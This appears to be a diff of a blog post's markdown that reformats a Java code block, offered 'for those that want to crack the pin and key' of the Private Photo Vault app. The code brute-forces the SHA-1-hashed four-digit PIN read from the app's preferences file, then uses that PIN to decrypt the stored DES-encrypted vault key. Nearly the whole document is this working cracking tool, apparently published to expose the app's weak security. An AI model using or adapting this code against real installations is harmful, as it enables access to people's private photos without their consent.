@@ -29,83 +29,85 @@ These companies are selling products that claim to securely store your most inti
 
 So for those that want to crack the pin and key for a “Private Photo Vault” installation, here you go.
 
->public class Main {
->
->    public static void main(String[] args) {
->     
->     // "pin" and "enc_keys_pin" from com.enchantedcloud.photovault_preferences.xml
->        String hashedPIN = "7110eda4d09e062aa5e4a390b0a572ac0d2c0220"; // 1234
->        String encKeyPin = "Dar+SDapSbp1mKcztPYWi4vDcvGBNLM8B7WVy00MT1WK0gd2R4wAdg=="; // 1e8a99cb-ebe8-452c-b9da-6466a8a60e02
->
->        System.out.println("Cracking pin...");
->        String PIN = crackPIN(hashedPIN);
->        System.out.println("PIN is " + PIN);
->
->        System.out.println("Decrypting Key...");
->        String KEY = decryptKey(encKeyPin,PIN);
->        System.out.println("KEY is " + KEY);
->    }
->    
->    private static String decryptKey (String KEY, String PIN) {
->
->        while (PIN.length() < 8) {
->            PIN = PIN + 0;
->        }
->
->        SecretKey secKey = null;
->        try {
->            secKey = SecretKeyFactory.getInstance("DES").generateSecret(new DESKeySpec(PIN.getBytes("UTF8")));
->            byte[] bKey = Base64.decode(KEY);
->            Cipher cipher = Cipher.getInstance("DES");
->            cipher.init(2, (secKey));
->            return new String(cipher.doFinal(bKey));
->        } catch (InvalidKeySpecException e) {
->            e.printStackTrace();
->        } catch (NoSuchAlgorithmException e) {
->            e.printStackTrace();
->        } catch (InvalidKeyException e) {
->            e.printStackTrace();
->        } catch (UnsupportedEncodingException e) {
->            e.printStackTrace();
->        } catch (BadPaddingException e) {
->            e.printStackTrace();
->        } catch (IllegalBlockSizeException e) {
->            e.printStackTrace();
->        } catch (NoSuchPaddingException e) {
->            e.printStackTrace();
->        }
->        return null;
->    }
->
->    private static String crackPIN(String hashedPIN) {
->        for (int i = 0; i <= 9999;i++) {
->            String testPin = Integer.toString(i);
->            while (testPin.length() < 4) {
->                testPin = "0" + testPin;
->            }
->            try {
->                MessageDigest md = MessageDigest.getInstance("SHA-1");
->                md.reset();
->                md.update(testPin.getBytes());
->                if (hashedPIN.equals(bytesToHex(md.digest()))) {
->                    return testPin;
->
->                }
->            } catch (NoSuchAlgorithmException e) {
->                e.printStackTrace();
->            }
->        }
->        return null;
->    }
->
->    private static String bytesToHex(byte[] bytes) {
->        char[] hexArray = "0123456789abcdef".toCharArray();
->        char[] hexChars = new char[bytes.length * 2];
->        for ( int j = 0; j < bytes.length; j++ ) {
->            int v = bytes[j] & 0xFF;
->            hexChars[j * 2] = hexArray[v >>> 4];
->            hexChars[j * 2 + 1] = hexArray[v & 0x0F];
->        }
->        return new String(hexChars);
->    }
->}
+~~~ java
+public class Main {
+
+    public static void main(String[] args) {
+     
+     // "pin" and "enc_keys_pin" from com.enchantedcloud.photovault_preferences.xml
+        String hashedPIN = "7110eda4d09e062aa5e4a390b0a572ac0d2c0220"; // 1234
+        String encKeyPin = "Dar+SDapSbp1mKcztPYWi4vDcvGBNLM8B7WVy00MT1WK0gd2R4wAdg=="; // 1e8a99cb-ebe8-452c-b9da-6466a8a60e02
+
+        System.out.println("Cracking pin...");
+        String PIN = crackPIN(hashedPIN);
+        System.out.println("PIN is " + PIN);
+
+        System.out.println("Decrypting Key...");
+        String KEY = decryptKey(encKeyPin,PIN);
+        System.out.println("KEY is " + KEY);
+    }
+    
+    private static String decryptKey (String KEY, String PIN) {
+
+        while (PIN.length() < 8) {
+            PIN = PIN + 0;
+        }
+
+        SecretKey secKey = null;
+        try {
+            secKey = SecretKeyFactory.getInstance("DES").generateSecret(new DESKeySpec(PIN.getBytes("UTF8")));
+            byte[] bKey = Base64.decode(KEY);
+            Cipher cipher = Cipher.getInstance("DES");
+            cipher.init(2, (secKey));
+            return new String(cipher.doFinal(bKey));
+        } catch (InvalidKeySpecException e) {
+            e.printStackTrace();
+        } catch (NoSuchAlgorithmException e) {
+            e.printStackTrace();
+        } catch (InvalidKeyException e) {
+            e.printStackTrace();
+        } catch (UnsupportedEncodingException e) {
+            e.printStackTrace();
+        } catch (BadPaddingException e) {
+            e.printStackTrace();
+        } catch (IllegalBlockSizeException e) {
+            e.printStackTrace();
+        } catch (NoSuchPaddingException e) {
+            e.printStackTrace();
+        }
+        return null;
+    }
+
+    private static String crackPIN(String hashedPIN) {
+        for (int i = 0; i <= 9999;i++) {
+            String testPin = Integer.toString(i);
+            while (testPin.length() < 4) {
+                testPin = "0" + testPin;
+            }
+            try {
+                MessageDigest md = MessageDigest.getInstance("SHA-1");
+                md.reset();
+                md.update(testPin.getBytes());
+                if (hashedPIN.equals(bytesToHex(md.digest()))) {
+                    return testPin;
+
+                }
+            } catch (NoSuchAlgorithmException e) {
+                e.printStackTrace();
+            }
+        }
+        return null;
+    }
+
+    private static String bytesToHex(byte[] bytes) {
+        char[] hexArray = "0123456789abcdef".toCharArray();
+        char[] hexChars = new char[bytes.length * 2];
+        for ( int j = 0; j < bytes.length; j++ ) {
+            int v = bytes[j] & 0xFF;
+            hexChars[j * 2] = hexArray[v >>> 4];
+            hexChars[j * 2 + 1] = hexArray[v & 0x0F];
+        }
+        return new String(hexChars);
+    }
+}
+~~~
